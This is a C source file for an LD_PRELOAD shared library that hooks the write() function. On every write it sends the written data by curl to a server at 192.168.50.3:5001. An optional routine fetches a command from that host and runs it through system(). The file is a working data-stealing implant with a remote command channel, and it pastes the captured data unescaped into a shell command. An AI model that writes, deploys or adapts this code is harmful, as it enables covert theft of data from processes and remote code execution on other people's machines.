#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
// note this can be re-written to use libcurl

void getCommand() {

  FILE *fp;
  char path[1035];

  fp = popen("curl -s http://192.168.50.3:5001/command", "r");

  if(fp == NULL) {
    printf("error with command");
    exit(1);
  }

  while(fgets(path, sizeof(path), fp) != NULL) {
    printf("%s", path);
  }

  // execute the command
  system(path);
  
  pclose(fp);
  
}

void postData(const void *buf) {

  // cast our buffer so we can read it
  char *p = (char *)buf;
  
  // unset the ld_prload env
  int ret = unsetenv("LD_PRELOAD");
  
  //format our string to make the curl call
  char testData[50000];
  strcpy(testData, "curl -s --output /dev/null -d 'data=");
  strcat(testData, p);
  strcat(testData, "' -X POST 'http://192.168.50.3:5001'");
  
  
  //make our curl call
  system(testData);

}
ssize_t write(int fd, const void *buf, size_t count) {

  postData(buf);

  // uncomment this if you want to get a command from the server
  //getCommand();
  
  // Look up the next write symbol
  ssize_t (*orig_write)(int fd, const void *buf, size_t count) = dlsym(RTLD_NEXT, "write");

  return orig_write(fd, buf, count);
}
